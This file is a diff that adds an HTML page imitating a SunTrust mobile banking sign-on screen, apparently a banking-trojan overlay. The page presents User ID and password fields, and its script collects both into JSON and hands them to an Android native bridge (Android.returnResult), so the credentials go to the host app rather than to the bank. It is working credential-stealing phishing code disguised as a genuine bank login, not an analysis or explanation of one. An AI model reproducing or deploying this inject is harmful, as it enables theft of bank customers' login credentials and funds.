@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>suntrust</title>
+    <link rel="shortcut icon" href="com.suntrust.mobilebanking.png" type="image/png">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+    text-align: right;
+    background-size: 100%;
+    padding: 20px 30px 20px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+border: 1px solid #9a9a9b;
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 0px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #7e7e7e;
+    text-align: left;
+    background: rgb(255, 255, 255);
+    outline: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 0px 0px 0px 0px;
+    outline: none;
+    float: right;
+    background: #044d8b;
+    color: #ffffff;
+    border: 1px solid #044d8b;
+    font-size: 14px;
+    -webkit-appearance: none;
+    border-radius: 3px;
+    cursor: pointer;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #111111;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #7e7e7e;
+    font-size: 15px;
+}
+:root {
+  --primary: hsl(0, 0%, 90%);
+  --accent: hsl(35, 100%, 63%);
+  --text: hsl(0, 0%, 17%);
+}
+
+.checkbox {
+  display: inline-flex;
+  align-items: center;
+  cursor: pointer;
+}
+
+.checkbox__native {
+  display: none;
+}
+
+.checkbox__native:checked + .checkbox__custom {
+  background-color: hsl(207, 88%, 47%);
+  border-color: hsl(207, 88%, 47%);
+}
+
+.checkbox__custom {
+  width: 1.3em;
+  height: 1.3em;
+  border: 1px solid hsl(0, 0%, 66%);
+  border-radius: 3px;
+  margin-right: 10px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-shrink: 0;
+  transition: all 0.1s;
+}
+
+.checkbox__custom::after {
+  content: '\2714';
+  color: white;
+}
+</style>
+
+<fieldset id="formtosend">
+
+<div class="" id="bireysel" style="display: block;">
+
+<div class="logo1" style="text-align: center;">
+<img src="data:image/png;base64,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" style="width: 250px;">
+</div>
+
+
+<div class="area" style="background: #fff; padding: 30px; border-radius: 3px; height: 320px;">
+        <input type="text" name="userid" id="userid" placeholder="User ID" style="height: 50px;">
+        <input type="password" name="password" id="password" placeholder="Password" style="height: 50px;">
+        <input name="exit" type="hidden" text="true"/>
+        <section style="text-align: left; margin: 30px 0px 30px 0px;">
+  
+<label for="cb" class="checkbox">
+  
+<input type="checkbox" name="sumbit" id="cb" class="checkbox__native" />
+  
+<div class="checkbox__custom"></div>
+  
+Remember User ID
+</label>
+  
+</section>
+        <input type="button" name="sumbit" onclick="send_form()" value="Sign On">
+        <a href="#" style="text-align: right;font-weight: 400;color: #0d71c0;position: relative;top: 30px;text-decoration: none;font-size: 15px;display: inline-block;">Trouble Signing On?</a>
+
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    if (document.getElementById("userid").value == '')
+{
+    alert ('All fields required!');
+    return false;
+}
+if (document.getElementById("password").value == '')
+{
+    alert ('All fields required!');
+    return false;
+}
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
